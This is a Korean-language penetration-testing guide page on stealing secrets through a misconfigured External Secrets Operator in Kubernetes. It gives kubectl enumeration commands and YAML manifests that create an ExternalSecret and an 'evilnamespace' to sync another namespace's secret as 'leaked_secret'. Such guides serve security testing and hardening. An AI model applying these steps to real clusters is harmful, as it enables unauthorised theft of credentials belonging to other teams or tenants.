# External Secret Operator

**이 페이지의 원래 저자는** [**Fares**](https://www.linkedin.com/in/fares-siala/)입니다.

이 페이지는 잘못 구성된 ESO 또는 ESO를 사용하여 비밀을 동기화하는 애플리케이션에서 비밀을 훔치는 방법에 대한 몇 가지 팁을 제공합니다.

## Disclaimer

아래에 보여지는 기술은 특정 조건이 충족될 때만 작동할 수 있습니다. 예를 들어, 이는 비밀이 귀하가 소유하거나 침해한 네임스페이스에서 동기화되도록 허용하는 요구 사항에 따라 달라집니다. 스스로 알아내야 합니다.

## Prerequisites

1. 네임스페이스에서 관리자 권한을 가진 kubernetes / openshift 클러스터에 대한 발판
2. 클러스터 수준에서 최소한 ExternalSecret에 대한 읽기 권한
3. ESO가 귀하의 비밀을 동기화할 수 있도록 필요한 레이블 / 주석 또는 그룹 구성원이 있는지 확인하십시오. 운이 좋다면 정의된 비밀을 자유롭게 훔칠 수 있습니다.

### Gathering information about existing ClusterSecretStore

이 리소스를 읽을 수 있는 충분한 권한이 있는 사용자가 있다고 가정하고, 먼저 기존 _**ClusterSecretStores**_를 나열하는 것부터 시작하십시오.
```sh
kubectl get ClusterSecretStore
```
### ExternalSecret 열거

ClusterSecretStore 이름이 _**mystore**_인 것을 발견했다고 가정해 보겠습니다. 관련된 externalsecret을 열거하는 것으로 계속 진행하십시오.
```sh
kubectl get externalsecret -A | grep mystore
```
_이 리소스는 네임스페이스 범위이므로, 어떤 네임스페이스를 찾아야 할지 모른다면 -A 옵션을 추가하여 모든 네임스페이스를 검색하세요._

정의된 externalsecret 목록을 얻어야 합니다. _**mysecret**_라는 externalsecret 객체가 _**mynamespace**_ 네임스페이스에 의해 정의되고 사용되고 있다고 가정해 보겠습니다. 그것이 어떤 종류의 비밀을 보유하고 있는지에 대한 정보를 조금 더 수집하세요.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### 조각 조립하기

여기에서 하나 또는 여러 개의 비밀 이름(Secret 리소스에 정의된 대로)을 얻을 수 있습니다. 다음과 유사한 출력을 얻을 수 있습니다:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
지금까지 우리는 다음을 얻었습니다:

- ClusterSecretStore의 이름
- ExternalSecret의 이름
- 비밀의 이름

이제 필요한 모든 것을 갖추었으므로, ExternalSecret을 생성할 수 있습니다(그리고 궁극적으로 새 비밀이 동기화되도록 필요한 전제 조건을 준수하기 위해 새 Namespace를 패치/생성할 수 있습니다):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
몇 분 후, 동기화 조건이 충족되면 네임스페이스 내에서 유출된 비밀을 볼 수 있어야 합니다.
```sh
kubectl get secret leaked_secret -o yaml
```
## References

{{#ref}}
https://external-secrets.io/latest/
{{#endref}}

{{#ref}}
https://github.com/external-secrets/external-secrets
{{#endref}}
